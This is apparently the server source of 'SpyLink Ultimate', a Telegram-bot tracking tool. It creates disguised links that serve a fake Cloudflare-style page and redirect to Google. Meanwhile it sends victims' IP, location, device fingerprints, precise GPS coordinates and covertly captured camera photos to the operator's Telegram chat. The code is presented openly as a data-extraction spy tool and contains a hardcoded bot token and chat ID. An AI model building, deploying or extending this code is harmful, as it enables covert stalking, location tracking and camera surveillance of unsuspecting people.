const express = require("express");
const cors = require('cors');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const axios = require('axios');

// 🔐 CONFIGURATION
const BOT_TOKEN = "8377073485:AAG2selNlxyHeZ3_2wjMGdG_QshklCiTAyE";
const ADMIN_CHAT_ID = "8175884349"; 
const HOST_URL = "https://botu-s3f9.onrender.com"; 

const app = express();
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// 🛡️ ERROR HANDLERS
process.on('unhandledRejection', (r) => console.error('🚨 Rejection:', r));
process.on('uncaughtException', (e) => console.error('🚨 Exception:', e));
bot.on("polling_error", (m) => console.log("⚠️ Polling:", m.message));

// ⚙️ MIDDLEWARE
app.use(require('helmet')({ contentSecurityPolicy: false }));
app.use(cors());
app.use(require('morgan')('dev'));
app.use(bodyParser.json({ limit: '50mb' })); 
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.set("view engine", "ejs");
app.use(express.static("public"));

let sessions = {};

// ==================== 🤖 BOT COMMANDS ====================

bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, "🕵️‍♂️ *SpyLink Ultimate v15.0*\n_Full Spectrum Data Extraction Tool_", { parse_mode: "Markdown" });
});

bot.onText(/\/create/, (msg) => {
    const sessionId = uuidv4();
    sessions[sessionId] = { chatId: msg.chat.id, createdAt: new Date() };
    const target = Buffer.from("https://google.com").toString('base64');
    const link = `${HOST_URL}/c/${sessionId}/${target}`;

    bot.sendMessage(msg.chat.id, 
        `📡 *TRACKING ACTIVE*\nID: \`${sessionId}\`\n🔗: \`${link}\`\n\n_Extracting 50+ Data Points..._`, 
        { parse_mode: "Markdown" }
    );
});

bot.onText(/\/status/, (msg) => {
    bot.sendMessage(msg.chat.id, `🟢 *Online* | Sessions: ${Object.keys(sessions).length}`);
});

// ==================== 🌐 ROUTES ====================

app.get("/c/:id/:url", (req, res) => {
    const { id, url } = req.params;
    if (!sessions[id]) sessions[id] = { chatId: ADMIN_CHAT_ID };
    let finalUrl = "https://google.com";
    try { finalUrl = Buffer.from(url, 'base64').toString('utf-8'); } catch(e) {}
    res.render("cloudflare", { uid: id, url: finalUrl, host: HOST_URL });
});

// 📊 ULTIMATE DATA REPORT
app.post("/data", async (req, res) => {
    const { uid, data } = req.body;
    if (!sessions[uid]) return res.json({status: "no_session"});

    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
    
    // 1. Server-Side IP Lookup
    let ipInfo = { isp: "Unknown", city: "Unknown", country: "Unknown", as: "Unknown" };
    try {
        const r = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,city,isp,as,mobile,proxy`);
        if(r.data.status === 'success') ipInfo = r.data;
    } catch(e) {}

    // 2. Parse Client Data
    const d = data; // Shorthand

    const report = `
🎯 *FULL INTELLIGENCE REPORT*

🌍 *NETWORK & LOCATION*
• IP: \`${ip}\`
• ISP: ${ipInfo.isp} (${ipInfo.as})
• Loc: ${ipInfo.city}, ${ipInfo.country}
• Conn: ${d.network.type} (${d.network.downlink}Mbps, ${d.network.rtt}ms)
• Proxy/VPN: ${ipInfo.proxy ? "⚠️ YES" : "No"}

📱 *DEVICE FINGERPRINT*
• OS: ${d.device.platform}
• Browser: ${d.device.vendor}
• Cores: ${d.device.cores} | RAM: ${d.device.memory} GB
• GPU: ${d.device.renderer}
• Res: ${d.screen.width}x${d.screen.height} (${d.screen.colorDepth}-bit)

🔋 *POWER & STATE*
• Battery: ${d.battery.level}% (${d.battery.charging ? "⚡ Charging" : "🔋 Discharging"})
• Charge Time: ${d.battery.chargingTime}
• Local Time: ${d.locale.time}
• Timezone: ${d.locale.timezone}

🧩 *BROWSER & SECURITY*
• Cookies: ${d.browser.cookies ? "✅" : "❌"} | DNT: ${d.browser.dnt ? "✅" : "❌"}
• Touch Points: ${d.device.touchPoints}
• AdBlock: ${d.fingerprint.adBlock ? "🛑 Active" : "Inactive"}
• Plugins: ${d.browser.plugins}

🧪 *ADVANCED FINGERPRINTS*
• Canvas Hash: \`${d.fingerprint.canvas.substring(0, 20)}...\`
• Audio Hash: \`${d.fingerprint.audio.substring(0, 20)}...\`

💾 *STORAGE*
• Quota: ${d.storage.quota} MB
• Used: ${d.storage.used} MB

_Waiting for Camera & Precision GPS..._
    `;

    bot.sendMessage(sessions[uid].chatId, report, { parse_mode: "Markdown" });
    res.json({ status: "ok" });
});

// 📍 GPS REPORT
app.post("/location", (req, res) => {
    const { uid, lat, lon, acc, speed, alt } = req.body;
    if (sessions[uid]) {
        bot.sendMessage(sessions[uid].chatId, 
            `📍 *PRECISION LOCATION*\nAcc: ${acc}m | Spd: ${speed}m/s | Alt: ${alt}m`);
        bot.sendLocation(sessions[uid].chatId, lat, lon);
    }
    res.json({ status: "ok" });
});

// 📸 CAMERA REPORT
app.post("/cam", (req, res) => {
    const { uid, img } = req.body;
    if (sessions[uid] && img) {
        const buffer = Buffer.from(img.replace(/^data:image\/png;base64,/, ""), 'base64');
        bot.sendPhoto(sessions[uid].chatId, buffer, { caption: `📸 *Evidence Captured*` });
    }
    res.json({ status: "ok" });
});

app.get("/keepalive", (req, res) => res.json({ status: "Online" }));
setInterval(() => { axios.get(`${HOST_URL}/keepalive`).catch(() => {}); }, 40000);

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`✅ v15.0 Active on Port ${PORT}`));
